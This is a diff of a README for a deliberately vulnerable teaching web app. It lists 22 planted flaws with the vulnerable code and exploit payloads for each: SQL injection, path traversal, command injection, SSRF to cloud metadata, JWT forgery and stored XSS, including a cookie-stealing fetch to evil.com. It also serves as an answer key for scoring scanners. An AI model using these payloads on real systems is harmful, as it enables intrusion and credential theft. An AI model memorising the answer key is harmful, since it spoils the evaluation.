@@ -1,308 +1,72 @@
-# Raddit — 隐藏漏洞清单（教学用途）
-
-> **警告**：本项目仅用于安全教学与漏洞研究，严禁在生产环境部署。
-
-共 **22 个漏洞**，分布于 **15 条不同路径/端点**。
-
----
-
-## 漏洞一览
-
-| # | 类型 | 路径/位置 | 触发方式 |
-|---|------|-----------|---------|
-| 1 | SQL 注入 | `POST /api/auth/login` | username 字段 |
-| 2 | SQL 注入 | `GET /api/posts/search?q=` | q 参数 |
-| 3 | SQL 注入（ORDER BY）| `GET /api/posts?sort=&order=` | sort/order 参数 |
-| 4 | 路径穿越 | `GET /api/files/download?name=` | name 参数 |
-| 5 | 任意文件上传 | `POST /api/files/upload` | 无类型限制 |
-| 6 | 命令注入 | `GET /api/tools/ping?host=` | host 参数 |
-| 7 | SSRF | `GET /api/posts/preview?url=` | url 参数 |
-| 8 | IDOR（越权删除）| `DELETE /api/posts/:id` | 无所有权校验 |
-| 9 | 敏感数据暴露 | `GET /api/users/:id` | 返回密码哈希 |
-| 10 | 质量分配（权限提升）| `PUT /api/users/profile` | role 字段 |
-| 11 | JWT 弱密钥 | 所有认证端点 | 密钥为 "secret" |
-| 12 | JWT alg:none | 所有认证端点 | 接受无签名 token |
-| 13 | 信息泄露 | `GET /api/admin/debug` | 暴露配置/环境变量 |
-| 14 | 硬编码凭据 | `config/config.go` | admin:admin123 |
-| 15 | 日志密码泄露 | `POST /api/auth/login` | 明文密码写入日志 |
-| 16 | 无速率限制 | `POST /api/auth/login` | 可暴力破解 |
-| 17 | 开放重定向 | `POST /api/auth/login` | next 参数未验证 |
-| 18 | 存储型 XSS | `POST /api/posts` + 帖子详情页 | 帖子内容 |
-| 19 | 存储型 XSS | `POST /api/comments` + 评论区 | 评论内容 |
-| 20 | 反射型 XSS | `GET /api/posts/search` + 首页 | 搜索词回显 |
-| 21 | 存储型 XSS | `PUT /api/users/profile` + 个人页 | 个人简介字段 |
-| 22 | CSRF 缺失 | 所有状态变更端点 | 无 token 校验 |
-
----
-
-## 详细说明
-
-### 1. SQL 注入 — 登录接口
-**位置**：`backend/handlers/auth.go` → `Login()`
-```
-query := "SELECT ... WHERE username='" + req.Username + "'"
-```
-**利用**：用户名输入 `admin'--` 可跳过密码验证；`' OR '1'='1` 枚举所有用户。
-
----
-
-### 2. SQL 注入 — 搜索接口
-**位置**：`backend/handlers/posts.go` → `SearchPosts()`
-```
-"WHERE p.title LIKE '%" + keyword + "%'"
-```
-**利用**：`%' UNION SELECT id,username,password,email,role,username,0,0,datetime('now'),datetime('now') FROM users--`
-
----
-
-### 3. SQL 注入 — 排序参数（ORDER BY）
-**位置**：`backend/handlers/posts.go` → `ListPosts()`
-```go
-sortBy := c.DefaultQuery("sort", "p.created_at")  // 用户可控，直接拼入 ORDER BY
-order  := c.DefaultQuery("order", "DESC")          // 同样用户可控
-query = fmt.Sprintf("ORDER BY %s %s", sortBy, order)
-```
-
-**注意**：`sort=` 的注入直接展开为 `ORDER BY <expr>`，无任何前缀；`order=` 展开为 `ORDER BY p.created_at <suffix>`。
-
-**利用 A — 通过 `sort=` 内联 CASE 盲注（真条件正常返回，假条件报错）**：
-```
-GET /api/posts?sort=CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN p.created_at ELSE RAISE(ABORT,'sqli') END&order=DESC
-```
-`COUNT(*)>0` 为真 → 正常返回帖子列表；改为 `1=2` → 返回 `{"error":"Could not fetch posts"}`。
-
-**利用 B — 通过 `order=` 追加子查询（已验证可用）**：
-```
-GET /api/posts?sort=p.created_at&order=DESC,(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE RAISE(ABORT,'sqli') END)
-```
-生成：`ORDER BY p.created_at DESC,(SELECT CASE WHEN ...)` — 真条件静默通过，假条件触发 ABORT 错误。
-
-> 为何 `sort=(SELECT CASE WHEN ... THEN p.created_at ...)` 失败：SQLite FROM-less 标量子查询中 `p.created_at` 为外层关联引用，在 `ORDER BY` 子查询上下文里无法解析，直接写 CASE 表达式（利用 A）或注入 `order=` 后缀（利用 B）可绕过此限制。
-
----
-
-### 4. 路径穿越
-**位置**：`backend/handlers/files.go` → `DownloadFile()`
-```go
-filePath := config.UploadDir + "/" + filename
-// 未调用 filepath.Clean，也未校验 ".."
-```
-**利用**：`GET /api/files/download?name=../../etc/passwd`
-
----
-
-### 5. 任意文件上传
-**位置**：`backend/handlers/files.go` → `UploadFile()`
-```go
-filename := header.Filename  // 保留原始文件名，不校验扩展名
-```
-**利用**：上传 `.php`/`.sh`/`.exe` 文件，再通过路径穿越（漏洞4）执行。
-
----
-
-### 6. 命令注入
-**位置**：`backend/utils/utils.go` → `PingHost()`
-```go
-exec.Command("sh", "-c", "ping -c 3 "+host)
-```
-**利用**：`host=127.0.0.1; cat /etc/passwd` 或 `127.0.0.1 | id`
-
----
-
-### 7. SSRF（服务端请求伪造）
-**位置**：`backend/handlers/posts.go` → `PreviewURL()`
-```go
-client.Get(targetURL)  // targetURL 完全由用户控制
-```
-**利用**：`url=http://169.254.169.254/latest/meta-data/`（AWS 元数据）；内网扫描 `url=http://192.168.1.1`
-
----
-
-### 8. IDOR — 越权删除帖子
-**位置**：`backend/handlers/posts.go` → `DeletePost()`
-```go
-database.DB.Exec("DELETE FROM posts WHERE id=?", postID)
-// 未检查 post.user_id == 当前用户 ID
-```
-**利用**：任意用户可删除他人帖子，只需知道帖子 ID。
-
----
-
-### 9. 敏感数据暴露 — 密码哈希
-**位置**：`backend/handlers/users.go` → `GetUser()`
-```go
-"SELECT id, username, email, password, ..."
-// password 字段包含在 JSON 响应中
-```
-**利用**：`GET /api/users/1` 返回 bcrypt 哈希，可离线爆破。
-
----
-
-### 10. 质量分配 — 权限提升
-**位置**：`backend/handlers/users.go` → `UpdateProfile()`
-```go
-if req.Role != "" {
-    database.DB.Exec("UPDATE users SET role=? WHERE id=?", req.Role, userID)
-}
-```
-**利用**：普通用户发送 `{"role":"admin"}` 即可将自身提权至管理员。
-
----
-
-### 11. JWT 弱密钥
-**位置**：`backend/config/config.go`
-```go
-JWTSecret = getEnv("JWT_SECRET", "secret")
-```
-**利用**：使用 `jwt_tool` 或 hashcat 爆破，密钥为 `secret`，可伪造任意用户 token。
-
----
-
-### 12. JWT Algorithm Confusion（alg:none）
-**位置**：`backend/middleware/auth.go` → `parseToken()`
-```go
-if alg != "none" {
-    // 验证签名
-}
-// alg=none 时跳过签名验证
-```
-**利用**：构造 header `{"alg":"none","typ":"JWT"}`，payload `{"user_id":1,"role":"admin","exp":9999999999}`，签名留空，服务端直接接受。
-
----
-
-### 13. 信息泄露 — 调试端点
-**位置**：`backend/handlers/admin.go` → `SystemInfo()`  
-路径：`GET /api/admin/debug`（需 admin 角色，但结合漏洞10或12可绕过）
-```go
-"jwt_secret":     config.JWTSecret,
-"admin_password": config.AdminPassword,
-```
-**利用**：获取 JWT 密钥、管理员密码、数据库路径、环境变量等。
-
----
-
-### 14. 硬编码凭据
-**位置**：`backend/config/config.go` + `backend/database/database.go`
-```go
-// config.go
-AdminUsername = getEnv("ADMIN_USERNAME", "admin")
-AdminPassword = getEnv("ADMIN_PASSWORD", "admin123")
-
-// database.go — Initialize() 调用 seedAdmin()，首次启动时自动写入数据库
-DB.Exec("INSERT INTO users (..., role) VALUES (?, ?, ?, 'admin')",
-    config.AdminUsername, ..., string(hashed))
-```
-**利用**：首次启动（数据库文件不存在 / admin 用户未创建）时自动 seed 管理员账号，控制台打印 `Admin user created: admin / admin123`；直接使用 `admin` / `admin123` 登录即可获得全部管理权限。
-
-> **注意**：若数据库文件已存在且 admin 账号已写入，`seedAdmin()` 会跳过创建（`COUNT(*) > 0` 提前 return）。验证时须删除旧数据库文件（默认路径见 `config.DBPath`）后重启服务。
-
----
-
-### 15. 密码明文日志
-**位置**：`backend/handlers/auth.go` → `Login()`
-```go
-log.Printf("[AUDIT] Failed login attempt - username: %s password: %s ip: %s",
-    req.Username, req.Password, c.ClientIP())
-```
-**利用**：服务端日志（stdout、日志文件）中存有用户明文密码，获取日志即可得到密码。
-
----
-
-### 16. 无速率限制
-**位置**：`POST /api/auth/login`（无任何限速机制）  
-**利用**：可无限次尝试密码，配合漏洞 15 的日志泄露，或直接暴力破解。
-
----
-
-### 17. 开放重定向
-**位置**：`backend/handlers/auth.go` → `Login()`，前端 `Login.jsx`
-```go
-// 服务端原样返回 next 参数
-redirect_to: req.Next  // 未校验是否为站内路径
-```
-**利用**：钓鱼链接 `POST /api/auth/login` with `{"next":"https://evil.com"}`，登录成功后重定向至恶意站点。
-
----
-
-### 18. 存储型 XSS — 帖子内容
-**位置**：后端存储时不过滤（`handlers/posts.go`），前端 `PostCard.jsx` / `PostDetail.jsx`：
-```jsx
-dangerouslySetInnerHTML={{ __html: post.content }}
-```
-**利用**：发布含 `<script>fetch('https://evil.com?c='+document.cookie)</script>` 的帖子，所有访问者执行。
-
----
-
-### 19. 存储型 XSS — 评论内容
-**位置**：`Comment.jsx`
-```jsx
-dangerouslySetInnerHTML={{ __html: comment.content }}
-```
-**利用**：同上，通过评论植入 XSS payload。
-
----
-
-### 20. 反射型 XSS — 搜索回显
-**位置**：`Home.jsx`
-```jsx
-<span dangerouslySetInnerHTML={{ __html: searchQuery }} />
-```
-**利用**：构造链接 `/?q=<img src=x onerror=alert(1)>`，受害者点击后执行脚本。
-
----
-
-### 21. 存储型 XSS — 个人简介
-**位置**：`Profile.jsx`
-```jsx
-dangerouslySetInnerHTML={{ __html: profile.bio }}
-```
-**利用**：在个人简介中写入 XSS payload，访问该用户主页的人均受影响。
-
----
-
-### 22. CSRF（跨站请求伪造）
-**位置**：所有状态变更端点；`backend/handlers/auth.go` → `Login()` 设置 Cookie，`backend/main.go` → CORS 配置
-```go
-// auth.go — 登录时写入 HttpOnly Cookie，无显式 SameSite（浏览器默认 Lax）
-c.SetCookie("session", token, 86400, "/", "", false, true)
-// 服务端无任何 CSRF token 校验、Origin/Referer 验证
-
-// main.go — CORS 白名单严格限制
-AllowOrigins:     []string{"http://localhost:5173", "http://localhost:3000"},
-AllowCredentials: true,
-```
-
-**认证双通道**：登录响应同时写入 Cookie 并在 body 返回 token；前端将 token 存入 `localStorage` 并通过 `Authorization: Bearer` 发送，同时 `credentials: 'include'` 带上 Cookie；中间件**优先读 Cookie**（`extractToken` 先检查 Cookie，再检查 Bearer）。
-
-**利用约束**：
-- CORS 白名单仅允许 `localhost:5173/3000`，攻击者页面的 `credentials: 'include'` fetch 请求会被 preflight 拦截，响应不可读
-- Cookie 无显式 SameSite → 浏览器默认 Lax，跨站 POST 表单不携带 Cookie，进一步限制简单请求攻击
-- Bearer token 存于 `localStorage`，跨域 JS 无法直接读取，不构成传统 CSRF 面
-
-**真正可利用场景：结合 XSS（漏洞 #18–21）**
-一旦在受害者浏览器内取得同源 JS 执行权（XSS），CSRF 保护天然失效，可直接读取 `localStorage` token 或携带 Cookie 发起任意状态变更请求：
-```html
-<!-- 嵌入恶意帖子/评论，结合 XSS payload -->
-<script>
-// 同源执行，CORS 不阻拦，Cookie/token 均可用
-fetch('/api/users/profile', {
-  method: 'PUT',
-  credentials: 'include',
-  headers: { 'Content-Type': 'application/json',
-             'Authorization': 'Bearer ' + localStorage.getItem('token') },
-  body: JSON.stringify({ role: 'admin' })  // 结合漏洞10提权
-})
-</script>
-```
-
-> **结论**：单独的 CSRF 因 CORS 白名单 + SameSite Lax (implicit) 可利用性受限；与 XSS 组合后危害显著放大，是本项目漏洞链的关键节点。
-
----
-
-## 漏洞路径分布统计
-
-| 端点路径 | 漏洞数 | 漏洞编号 |
-|---------|--------|---------|
+# Raddit - Hidden Vulnerability List (Educational Use)
+
+> **Warning**: This project is for security education and vulnerability research only. Do not deploy it in production.
+
+The project contains **22 vulnerabilities** across **15 distinct paths/endpoints**.
+
+## Vulnerability Overview
+
+| # | Type | Path / Location | Trigger |
+|---|---|---|---|
+| 1 | SQL injection | `POST /api/auth/login` | `username` field |
+| 2 | SQL injection | `GET /api/posts/search?q=` | `q` parameter |
+| 3 | SQL injection (ORDER BY) | `GET /api/posts?sort=&order=` | `sort` / `order` parameters |
+| 4 | Path traversal | `GET /api/files/download?name=` | `name` parameter |
+| 5 | Arbitrary file upload | `POST /api/files/upload` | No file type restriction |
+| 6 | Command injection | `GET /api/tools/ping?host=` | `host` parameter |
+| 7 | SSRF | `GET /api/posts/preview?url=` | `url` parameter |
+| 8 | IDOR (unauthorized post deletion) | `DELETE /api/posts/:id` | No ownership check |
+| 9 | Sensitive data exposure | `GET /api/users/:id` | Returns password hash |
+| 10 | Mass assignment (privilege escalation) | `PUT /api/users/profile` | `role` field |
+| 11 | Weak JWT secret | All authenticated endpoints | Secret is `"secret"` |
+| 12 | JWT `alg:none` bypass | All authenticated endpoints | Accepts unsigned tokens |
+| 13 | Information disclosure | `GET /api/admin/debug` | Exposes config / environment values |
+| 14 | Hardcoded credentials | `config/config.go` | `admin:admin123` |
+| 15 | Plaintext password logging | `POST /api/auth/login` | Writes plaintext password to logs |
+| 16 | Missing rate limiting | `POST /api/auth/login` | Allows brute-force attempts |
+| 17 | Open redirect | `POST /api/auth/login` | Unvalidated `next` parameter |
+| 18 | Stored XSS | `POST /api/posts` + post detail page | Post content |
+| 19 | Stored XSS | `POST /api/comments` + comment section | Comment content |
+| 20 | Reflected XSS | `GET /api/posts/search` + home page | Reflected search term |
+| 21 | Stored XSS | `PUT /api/users/profile` + profile page | Profile bio field |
+| 22 | Missing CSRF protection | All state-changing endpoints | No CSRF token validation |
+
+## Evaluation Grouping
+
+### Issue Category Coverage
+
+The 22 answer-key vulnerabilities are grouped into five mutually exclusive categories by the kind of security reasoning needed to detect them. This grouping is used to evaluate the issue scope covered by different scanning approaches.
+
+| Category | Vulnerability IDs | Count |
+|---|---|---:|
+| Injection, request, and renderer sinks | #1, #2, #3, #4, #6, #7, #18, #19, #20, #21 | 10 |
+| Access-control and account-state logic | #8, #10 | 2 |
+| Auth, session, and token design | #11, #12, #17 | 3 |
+| Missing preventive controls | #5, #16, #22 | 3 |
+| Sensitive-data and configuration exposure | #9, #13, #14, #15 | 4 |
+
+### Ideal Delivery Units
+
+The 22 answer-key vulnerabilities are also grouped into ideal delivery units. An ideal delivery unit is not a vulnerability count; it is a patch boundary that would be easier for a reviewer to inspect.
+
+| Ideal delivery unit | Vulnerability IDs | Rationale |
+|---|---|---|
+| Login and authentication abuse controls | #1, #15, #16, #17 | These issues share the login handler and authentication flow. A reviewer can assess credential handling, query safety, login abuse resistance, and post-login redirect behavior together. |
+| Post query construction safety | #2, #3 | Both are dynamic SQL construction issues in post listing/search paths and should be reviewed with one query-building strategy. |
+| File upload and download boundary | #4, #5 | Upload acceptance and download path resolution form one file-handling trust boundary. They should be reviewed together for type/extension validation, filename normalization, storage path safety, and file-serving behavior. |
+| Server-side outbound interaction safety | #6, #7 | Both connect user input to server-side command execution or network requests. The shared review question is whether external interaction is validated, constrained, or allowlisted. |
+| User authorization and profile data controls | #8, #9, #10 | These are account and ownership policy failures. They require joint review of route authorization, user object serialization, and profile update permissions. |
+| JWT and default credential hardening | #11, #12, #14 | These issues jointly determine whether attackers can forge privileged sessions or obtain administrative access through weak defaults. They should be reviewed as one authentication trust-boundary hardening unit. |
+| Admin debug data exposure | #13 | The debug endpoint is a distinct administrative information-disclosure surface and can be reviewed independently once authentication and role enforcement are understood. |
+| Frontend unsafe HTML rendering | #18, #19, #20, #21 | These share the same frontend rendering risk and should use a consistent sanitization or escaping strategy across content surfaces. |
+| Cross-site request forgery protection | #22 | CSRF is a cross-cutting control for state-changing endpoints and usually requires coordinated review of middleware, client request behavior, and route coverage. |
+
+The answer key contains 22 vulnerabilities, but the preferred review shape is **9 ideal delivery units**.
+
+## Vulnerability Distribution By Path
+
+| Endpoint path | Vulnerability count | Vulnerability IDs |
+|---|---:|---|
 | `POST /api/auth/login` | 4 | #1, #15, #16, #17 |
 | `GET /api/posts` | 1 | #3 |
 | `GET /api/posts/search` | 2 | #2, #20 |
@@ -316,21 +80,299 @@ fetch('/api/users/profile', {
 | `GET /api/files/download` | 1 | #4 |
 | `GET /api/tools/ping` | 1 | #6 |
 | `GET /api/admin/debug` | 1 | #13 |
-| 全部认证端点 | 2 | #11, #12 |
-| 代码/配置层面 | 2 | #14, #22 |
+| All authenticated endpoints | 2 | #11, #12 |
+| Code / configuration layer | 2 | #14, #22 |
 
-**总计：22 个漏洞，跨 15 条路径**
+**Total: 22 vulnerabilities across 15 paths.**
 
----
+## Detailed Descriptions
 
-## 启动项目
+### 1. SQL Injection - Login Endpoint
 
-```bash
-# 后端
-cd backend && go run .
+**Location**: `backend/handlers/auth.go` -> `Login()`
 
-# 前端（另开终端）
-cd frontend && npm install && npm run dev
+```
+query := "SELECT ... WHERE username='" + req.Username + "'"
 ```
 
-访问：http://localhost:5173
+**Exploit**: Use `admin'--` as the username to bypass password verification, or use `' OR '1'='1` to enumerate users.
+
+### 2. SQL Injection - Search Endpoint
+
+**Location**: `backend/handlers/posts.go` -> `SearchPosts()`
+
+```
+"WHERE p.title LIKE '%" + keyword + "%'"
+```
+
+**Exploit**: `%' UNION SELECT id,username,password,email,role,username,0,0,datetime('now'),datetime('now') FROM users--`
+
+### 3. SQL Injection - Sort Parameters (ORDER BY)
+
+**Location**: `backend/handlers/posts.go` -> `ListPosts()`
+
+```go
+sortBy := c.DefaultQuery("sort", "p.created_at")  // user-controlled, directly inserted into ORDER BY
+order  := c.DefaultQuery("order", "DESC")          // also user-controlled
+query = fmt.Sprintf("ORDER BY %s %s", sortBy, order)
+```
+
+**Note**: Injection through `sort=` expands directly as `ORDER BY <expr>` with no prefix. Injection through `order=` expands as `ORDER BY p.created_at <suffix>`.
+
+**Exploit A - inline `CASE` blind injection through `sort=` (true condition returns normally, false condition errors):**
+
+```
+GET /api/posts?sort=CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN p.created_at ELSE RAISE(ABORT,'sqli') END&order=DESC
+```
+
+When `COUNT(*)>0` is true, the post list returns normally. Changing the condition to `1=2` returns `{"error":"Could not fetch posts"}`.
+
+**Exploit B - append a subquery through `order=` (verified):**
+
+```
+GET /api/posts?sort=p.created_at&order=DESC,(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE RAISE(ABORT,'sqli') END)
+```
+
+This generates `ORDER BY p.created_at DESC,(SELECT CASE WHEN ...)`. The true condition passes silently, and the false condition triggers an `ABORT` error.
+
+> Why `sort=(SELECT CASE WHEN ... THEN p.created_at ...)` fails: in a SQLite scalar subquery without its own `FROM`, `p.created_at` is treated as an outer correlated reference and cannot be resolved in this `ORDER BY` subquery context. Writing the `CASE` expression directly (Exploit A) or injecting the `order=` suffix (Exploit B) bypasses this limitation.
+
+### 4. Path Traversal
+
+**Location**: `backend/handlers/files.go` -> `DownloadFile()`
+
+```go
+filePath := config.UploadDir + "/" + filename
+// No filepath.Clean call and no ".." validation
+```
+
+**Exploit**: `GET /api/files/download?name=../../etc/passwd`
+
+### 5. Arbitrary File Upload
+
+**Location**: `backend/handlers/files.go` -> `UploadFile()`
+
+```go
+filename := header.Filename  // preserves the original filename and does not validate the extension
+```
+
+**Exploit**: Upload a `.php`, `.sh`, or `.exe` file, then use path traversal (vulnerability #4) to reach it.
+
+### 6. Command Injection
+
+**Location**: `backend/utils/utils.go` -> `PingHost()`
+
+```go
+exec.Command("sh", "-c", "ping -c 3 "+host)
+```
+
+**Exploit**: `host=127.0.0.1; cat /etc/passwd` or `127.0.0.1 | id`
+
+### 7. SSRF (Server-Side Request Forgery)
+
+**Location**: `backend/handlers/posts.go` -> `PreviewURL()`
+
+```go
+client.Get(targetURL)  // targetURL is fully user-controlled
+```
+
+**Exploit**: `url=http://169.254.169.254/latest/meta-data/` for AWS metadata, or `url=http://192.168.1.1` for internal network probing.
+
+### 8. IDOR - Unauthorized Post Deletion
+
+**Location**: `backend/handlers/posts.go` -> `DeletePost()`
+
+```go
+database.DB.Exec("DELETE FROM posts WHERE id=?", postID)
+// Does not check whether post.user_id == current user ID
+```
+
+**Exploit**: Any user can delete another user's post if they know the post ID.
+
+### 9. Sensitive Data Exposure - Password Hash
+
+**Location**: `backend/handlers/users.go` -> `GetUser()`
+
+```go
+"SELECT id, username, email, password, ..."
+// The password field is included in the JSON response
+```
+
+**Exploit**: `GET /api/users/1` returns a bcrypt hash that can be attacked offline.
+
+### 10. Mass Assignment - Privilege Escalation
+
+**Location**: `backend/handlers/users.go` -> `UpdateProfile()`
+
+```go
+if req.Role != "" {
+    database.DB.Exec("UPDATE users SET role=? WHERE id=?", req.Role, userID)
+}
+```
+
+**Exploit**: A regular user sends `{"role":"admin"}` to promote themselves to administrator.
+
+### 11. Weak JWT Secret
+
+**Location**: `backend/config/config.go`
+
+```go
+JWTSecret = getEnv("JWT_SECRET", "secret")
+```
+
+**Exploit**: Use `jwt_tool` or hashcat to recover the secret `secret`, then forge arbitrary user tokens.
+
+### 12. JWT Algorithm Confusion (`alg:none`)
+
+**Location**: `backend/middleware/auth.go` -> `parseToken()`
+
+```go
+if alg != "none" {
+    // verify signature
+}
+// When alg=none, signature verification is skipped
+```
+
+**Exploit**: Construct a header `{"alg":"none","typ":"JWT"}`, payload `{"user_id":1,"role":"admin","exp":9999999999}`, and leave the signature empty. The server accepts the token directly.
+
+### 13. Information Disclosure - Debug Endpoint
+
+**Location**: `backend/handlers/admin.go` -> `SystemInfo()`
+
+Path: `GET /api/admin/debug` (requires the admin role, but can be reached by chaining vulnerability #10 or #12)
+
+```go
+"jwt_secret":     config.JWTSecret,
+"admin_password": config.AdminPassword,
+```
+
+**Exploit**: Obtain the JWT secret, administrator password, database path, environment variables, and other sensitive configuration data.
+
+### 14. Hardcoded Credentials
+
+**Location**: `backend/config/config.go` + `backend/database/database.go`
+
+```go
+// config.go
+AdminUsername = getEnv("ADMIN_USERNAME", "admin")
+AdminPassword = getEnv("ADMIN_PASSWORD", "admin123")
+
+// database.go - Initialize() calls seedAdmin(), which writes the initial admin user
+DB.Exec("INSERT INTO users (..., role) VALUES (?, ?, ?, 'admin')",
+    config.AdminUsername, ..., string(hashed))
+```
+
+**Exploit**: On first startup, when the database file does not exist or the admin user has not been created, the application seeds an administrator account and prints `Admin user created: admin / admin123` to the console. Logging in with `admin` / `admin123` grants full administrative access.
+
+> **Note**: If the database file already exists and the admin account has already been seeded, `seedAdmin()` skips creation (`COUNT(*) > 0` returns early). For validation, delete the old database file (see `config.DBPath` for the default path) before restarting the service.
+
+### 15. Plaintext Password Logging
+
+**Location**: `backend/handlers/auth.go` -> `Login()`
+
+```go
+log.Printf("[AUDIT] Failed login attempt - username: %s password: %s ip: %s",
+    req.Username, req.Password, c.ClientIP())
+```
+
+**Exploit**: Server logs, including stdout or log files, contain users' plaintext passwords. Anyone with log access can recover the password.
+
+### 16. Missing Rate Limiting
+
+**Location**: `POST /api/auth/login` (no rate-limiting mechanism)
+
+**Exploit**: Attackers can make unlimited password attempts, enabling brute force and compounding the plaintext password logging issue in vulnerability #15.
+
+### 17. Open Redirect
+
+**Location**: `backend/handlers/auth.go` -> `Login()`, frontend `Login.jsx`
+
+```go
+// Server returns the next parameter unchanged
+redirect_to: req.Next  // no validation that it is an internal path
+```
+
+**Exploit**: A phishing flow submits `POST /api/auth/login` with `{"next":"https://evil.com"}`. After login, the victim is redirected to the malicious site.
+
+### 18. Stored XSS - Post Content
+
+**Location**: Backend stores content without filtering (`handlers/posts.go`); frontend `PostCard.jsx` / `PostDetail.jsx`:
+
+```jsx
+dangerouslySetInnerHTML={{ __html: post.content }}
+```
+
+**Exploit**: Publish a post containing `<script>fetch('https://evil.com?c='+document.cookie)</script>`. The script executes for every visitor.
+
+### 19. Stored XSS - Comment Content
+
+**Location**: `Comment.jsx`
+
+```jsx
+dangerouslySetInnerHTML={{ __html: comment.content }}
+```
+
+**Exploit**: Same as above, but injected through a comment.
+
+### 20. Reflected XSS - Search Echo
+
+**Location**: `Home.jsx`
+
+```jsx
+<span dangerouslySetInnerHTML={{ __html: searchQuery }} />
+```
+
+**Exploit**: Send a victim a link such as `/?q=<img src=x onerror=alert(1)>`; the payload executes when the victim opens it.
+
+### 21. Stored XSS - Profile Bio
+
+**Location**: `Profile.jsx`
+
+```jsx
+dangerouslySetInnerHTML={{ __html: profile.bio }}
+```
+
+**Exploit**: Place an XSS payload in the profile bio. It executes for anyone who visits the user's profile.
+
+### 22. CSRF (Cross-Site Request Forgery)
+
+**Location**: All state-changing endpoints; `backend/handlers/auth.go` -> `Login()` sets the cookie, and `backend/main.go` configures CORS.
+
+```go
+// auth.go - Login writes an HttpOnly cookie with no explicit SameSite setting
+// (browsers default to Lax)
+c.SetCookie("session", token, 86400, "/", "", false, true)
+// The server has no CSRF token validation and no Origin/Referer validation
+
+// main.go - strict CORS allowlist
+AllowOrigins:     []string{"http://localhost:5173", "http://localhost:3000"},
+AllowCredentials: true,
+```
+
+**Dual authentication channel**: The login response writes a cookie and returns a token in the response body. The frontend stores the token in `localStorage` and sends it with `Authorization: Bearer`, while also using `credentials: 'include'` to include cookies. The middleware reads cookies first (`extractToken` checks the cookie before the bearer token).
+
+**Exploit constraints**:
+
+- The CORS allowlist only permits `localhost:5173/3000`, so credentialed `fetch` requests from an attacker page are blocked by preflight and the response cannot be read.
+- The cookie has no explicit SameSite value, so browsers default to Lax. Cross-site POST forms therefore do not send the cookie, further limiting simple request attacks.
+- The bearer token is stored in `localStorage`; cross-origin JavaScript cannot read it directly, so this is not a traditional standalone CSRF surface.
+
+**Actually exploitable scenario: chained with XSS (vulnerabilities #18-21)**
+
+Once an attacker obtains same-origin JavaScript execution in the victim's browser through XSS, CSRF protections are effectively bypassed. The script can read the `localStorage` token or send requests with cookies to perform arbitrary state-changing actions:
+
+```html
+<!-- Embedded in a malicious post/comment as an XSS payload -->
+<script>
+// Same-origin execution: CORS does not block this, and cookies/token are available
+fetch('/api/users/profile', {
+  method: 'PUT',
+  credentials: 'include',
+  headers: { 'Content-Type': 'application/json',
+             'Authorization': 'Bearer ' + localStorage.getItem('token') },
+  body: JSON.stringify({ role: 'admin' })  // chained with vulnerability #10
+})
+</script>
+```
+
+> **Conclusion**: Standalone CSRF exploitability is limited by the CORS allowlist and implicit SameSite=Lax behavior. When chained with XSS, however, the impact is significantly amplified, making this a key link in the project's vulnerability chain.
